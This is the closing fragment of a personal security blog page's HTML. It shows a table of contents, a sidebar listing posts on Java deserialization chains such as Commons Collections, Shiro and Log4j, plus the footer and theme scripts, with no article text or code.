toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%B1%BB"><span class="toc-number">2.2.</span> <span class="toc-text">获取目标类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%B1%BB%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">获取目标类方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%AD%E4%BB%A3%E8%B0%83%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">迭代调用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">完整代码</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/cc1-transformedmap/" title="TransformedMap调用链">TransformedMap调用链</a><time datetime="2025-11-21T09:31:49.234Z" title="Updated 2025-11-21 17:31:49">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/cc1-basic/" title="Commons Collections迭代调用链">Commons Collections迭代调用链</a><time datetime="2025-11-21T09:28:44.121Z" title="Updated 2025-11-21 17:28:44">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/cc-chain/" title="Commons-Collection链">Commons-Collection链</a><time datetime="2025-11-21T09:27:02.469Z" title="Updated 2025-11-21 17:27:02">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/shiro-unser/" title="Shiro反序列化">Shiro反序列化</a><time datetime="2025-11-21T09:16:07.902Z" title="Updated 2025-11-21 17:16:07">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/6591/" title="Log4j反序列化">Log4j反序列化</a><time datetime="2025-11-21T09:04:57.368Z" title="Updated 2025-11-21 17:04:57">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Java-ref/" title="Java反射">Java反射</a><time datetime="2025-11-21T09:02:26.139Z" title="Updated 2025-11-21 17:02:26">2025-11-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
